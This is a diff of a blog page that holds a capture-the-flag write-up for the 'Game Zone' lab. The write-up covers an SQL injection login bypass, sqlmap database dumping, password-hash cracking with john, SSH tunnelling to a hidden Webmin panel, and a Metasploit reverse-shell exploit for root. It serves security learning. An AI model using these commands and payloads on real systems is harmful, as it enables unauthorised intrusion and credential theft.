@@ -29,11 +29,11 @@
     
 
 
-    <base href="http://localhost:1313/">
-    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
-    <link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+    <base href="https://bsssq.xyz/">
+    <link rel="stylesheet" href="https://bsssq.xyz/css/style.css">
+    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
 </head>
-    <link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+    <link rel="stylesheet" href="https://bsssq.xyz/css/custom.css">
 </head>
 <body>
     
@@ -56,14 +56,14 @@ target IP address: 10.10.141.141</p>
 </code></pre><p>i want a very quick, one shot enumeration of the open ports and what services they are running.</p>
 <p>keep in mind that i&rsquo;m not doing a UDP scan on this network. from my experience, they usually don&rsquo;t bring any more information. rarely, you might discover and have to use some open UDP ports.</p>
 <p>visiting the IP address takes us to a website.</p>
-<p><img src="http://localhost:1313/landingpage.png" alt="landing page"></p>
+<p><img src="https://bsssq.xyz/landingpage.png" alt="landing page"></p>
 <p>the first question of the room is:</p>
 <blockquote>
 <p>What is the name of the large cartoon avatar holding a sniper on the forum?</p>
 </blockquote>
 <p>i just happen to know the name of this character. if you don&rsquo;t, you can download the image and do a reverse image search. the search will lead you to the name of the video game: hitman. if you google hitman, you&rsquo;ll know the name of the protagonist (the dude in the photo) is Agent 47.</p>
 <p>let&rsquo;s check back on our nmap scan.</p>
-<p><img src="http://localhost:1313/nmap1.png" alt="nmap"></p>
+<p><img src="https://bsssq.xyz/nmap1.png" alt="nmap"></p>
 <p>we have 2 open ports, according to this scan: port 22 (SSH) and port 80 (HTTP). port 80 is obviously the website. let&rsquo;s dig around on the website a bit more.</p>
 <p>as we can see on the landing page, there&rsquo;s a login form. we have 2 options here: either try to use SQL injection (sqli), or try to brute force the login form if sqli is not possible.</p>
 <p>a login SQL query usually looks something like:</p>
@@ -77,52 +77,52 @@ target IP address: 10.10.141.141</p>
 </span></span></span></code></pre></div><p>in a weak system that didn&rsquo;t sanitize user input, this would break the login query and log us in as admin, because the password is <strong>always true</strong>.
 let&rsquo;s try to login, but let&rsquo;s set the username as &ldquo;&rsquo; OR 1=1 &ndash; -&rdquo;</p>
 <p>it worked! the site took us to a page called &ldquo;portal.php&rdquo;.</p>
-<p><img src="http://localhost:1313/portal.png" alt="portal"></p>
+<p><img src="https://bsssq.xyz/portal.png" alt="portal"></p>
 <p>it seems to be a form where you can search for a game review. hitting search with no game in the field shows us a list of the game reviews on the database.</p>
-<p><img src="http://localhost:1313/portal2.png" alt="portal2"></p>
+<p><img src="https://bsssq.xyz/portal2.png" alt="portal2"></p>
 <p>let&rsquo;s try to search for a game and intercept the request in burp suite. we&rsquo;ll save the request as a text file, then feed it to sqlmap (an automated SQLi attack tool).</p>
 <p>the intercepted request:</p>
-<p><img src="http://localhost:1313/burp.png" alt="burp"></p>
+<p><img src="https://bsssq.xyz/burp.png" alt="burp"></p>
 <p>i saved the request as burp.txt.</p>
 <p>in sqlmap, we can use the command:</p>
 <pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql --dump
 </code></pre><p>what this will do is dump the contents of the entire database. this can be a very noisy operation, so i&rsquo;d advise against it.
 the more stealthy approach is to dump the info in little parts, starting with the databases, then the tables inside the databases, and finally the contents of the tables.</p>
 <pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql --dbs
-</code></pre><p><img src="http://localhost:1313/databases.png" alt="databases"></p>
+</code></pre><p><img src="https://bsssq.xyz/databases.png" alt="databases"></p>
 <p>we can see 5 databases. &ldquo;information_schema&rdquo; and &ldquo;performance_schema&rdquo; are usually default generated databases, so let&rsquo;s focus on the database &ldquo;db&rdquo;.</p>
 <pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql -D db --tables
-</code></pre><p><img src="http://localhost:1313/tables.png" alt="tables"></p>
+</code></pre><p><img src="https://bsssq.xyz/tables.png" alt="tables"></p>
 <p>there are 2 tables: post and users. obviously, you want to dump the contents of the user table to see if there are any hashes or plaintext passwords (rare) stored.</p>
 <pre tabindex="0"><code>sqlmap -r burp.txt --dbms=mysql -D db -T users --dump
-</code></pre><p><img src="http://localhost:1313/hash.png" alt="hash"></p>
+</code></pre><p><img src="https://bsssq.xyz/hash.png" alt="hash"></p>
 <p>there&rsquo;s a user (agent47), along with their password hash (ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14).</p>
 <p>what can we do with this hash? well, we can crack it! to crack it, you can either use john the ripper or hashcat. for this example, let&rsquo;s use john. before we do that though, we need to identify the hash. there are a variety of ways to identify hashes. you can either use an online hash identifier, like the one on <a href="https://hashes.com/en/tools/hash_identifier">hashes.com</a>, or you can tell from experience if you&rsquo;ve been exposed to hashes in the past. i just happen to know that this is a SHA256 hash, so let&rsquo;s work on cracking it with john. first, save the hash to a file.</p>
 <pre tabindex="0"><code>john agent47.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
-</code></pre><p><img src="http://localhost:1313/john.png" alt="john"></p>
+</code></pre><p><img src="https://bsssq.xyz/john.png" alt="john"></p>
 <p>since i&rsquo;ve already performed this crack, the result has been cached and pops up right away for me. normally, you will have to wait a while as john proceeds through the wordlists provided. hashcat might be a better option in some cases, as it can harness your GPU&rsquo;s CUDA cores and crack the hashes a lot faster.</p>
 <p>so we now have the credentials agent47:videogamer124. what can we do with this information? if you remember the nmap scan at the beginning, there was an SSH service running on port 22. let&rsquo;s attempt to SSH into agent47&rsquo;s machine.</p>
 <pre tabindex="0"><code>ssh agent47@10.10.141.141
-</code></pre><p><img src="http://localhost:1313/userflag.png" alt="user_flag"></p>
+</code></pre><p><img src="https://bsssq.xyz/userflag.png" alt="user_flag"></p>
 <p>we got our first flag! sweet. so, what now? in most cases, an attacker won&rsquo;t simply stop here. the primary goal of an attacker is to gain root/admin access.</p>
 <p>in the case of web applications like game zone, some services may be hidden behind firewalls. in some networks too, some websites may be blocked. what we can do in that case, is to create a reverse SSH tunnel that forwards the blocked traffic to a server that we own, then view it. -L is a local tunnel (YOU &lt;- CLIENT).</p>
 <p>first, we have to see the sockets that are running on a host.
 from inside the SSH terminal:</p>
 <pre tabindex="0"><code>ss -tulpn
 </code></pre><p>-t displays TCP sockets, -u displays UDP sockets, -l displays listening sockets, -p displays the process using the socket, -n makes sure the hostnames aren&rsquo;t resolved.</p>
-<p><img src="http://localhost:1313/tulpn.png" alt="sockets"></p>
+<p><img src="https://bsssq.xyz/tulpn.png" alt="sockets"></p>
 <p>we can see that there&rsquo;s a service running on port 10000. the service is hidden, meaning it&rsquo;s probably behind a firewall rule. since we&rsquo;re not root, we can&rsquo;t modify the iptables list. let&rsquo;s create a reverse SSH tunnel and make the service visible to us. on our local machine, run:</p>
 <pre tabindex="0"><code>ssh -L 10000:localhost:10000 agent47@10.10.141.141
 </code></pre><p>if you visit localhost:10000 in a browser, you&rsquo;ll now see the webmin login page that was previously hidden.</p>
-<p><img src="http://localhost:1313/webminlogin.png" alt="webmin"></p>
+<p><img src="https://bsssq.xyz/webminlogin.png" alt="webmin"></p>
 <p>try logging in with agent47:videogamer124.</p>
 <p>it works! and we can see some system information about the service.</p>
-<p><img src="http://localhost:1313/webmininfo.png" alt="webmin_info"></p>
+<p><img src="https://bsssq.xyz/webmininfo.png" alt="webmin_info"></p>
 <p>the most important thing here is the webmin version: 1.580. we can use this information to search for an exploit relating to this exact version. i like to use searchsploit, because we&rsquo;re going to use metasploit, but you can use google or any other exploit database to find it.</p>
-<p><img src="http://localhost:1313/searchsploit.png" alt="searchsploit"></p>
+<p><img src="https://bsssq.xyz/searchsploit.png" alt="searchsploit"></p>
 <p>we&rsquo;re going to use the first result: /file/show.cgi Remote Command Execution. this exploits an arbitrary command execution vulnerability in our version of webmin. the vulnerability exists in /file/show.cgi and will allow an authenticated user (agent47) to execute arbitrary commands with root privileges.</p>
 <p>fire up msfconsole, and search for this exploit.</p>
-<p><img src="http://localhost:1313/msfconsole.png" alt="msfconsole"></p>
+<p><img src="https://bsssq.xyz/msfconsole.png" alt="msfconsole"></p>
 <p>now, let&rsquo;s configure our exploit.</p>
 <pre tabindex="0"><code>set payload cmd/unix/reverse
 set PASSWORD videogamer124
@@ -133,7 +133,7 @@ set LHOST 10.9.6.194
 set LPORT 4444
 run
 </code></pre><p>if the exploit is successful, we&rsquo;ll get a shell. remember, the reverse ssh tunnel needs to be running for this exploit to work. when you get the shell, upgrade to a proper shell by typing <code>shell</code>. we&rsquo;ll be in the /usr/share/webmin/file directory, and the root flag is stored at /root/root.txt.</p>
-<p><img src="http://localhost:1313/root.png" alt="root"></p>
+<p><img src="https://bsssq.xyz/root.png" alt="root"></p>
 <p>so there it is. we used SQLi to get initial, low privilege access to the network. after some poking around and reverse SSH tunneling, we discovered a CMS called webmin, that had a pretty neat little exploit specific to its version.</p>
 <p>how can we prevent SQLi and the host of issues it can open up a private network to?</p>
 <ol>
@@ -151,8 +151,8 @@ run
 </div>
 
     
-     <script src="http://localhost:1313/p5/p5.min.js"></script>
-     <script src="http://localhost:1313/js/genart.js"></script>
-     <script src="http://localhost:1313/js/main.js"></script>
+     <script src="https://bsssq.xyz/p5/p5.min.js"></script>
+     <script src="https://bsssq.xyz/js/genart.js"></script>
+     <script src="https://bsssq.xyz/js/main.js"></script>
 </body>
 </html>
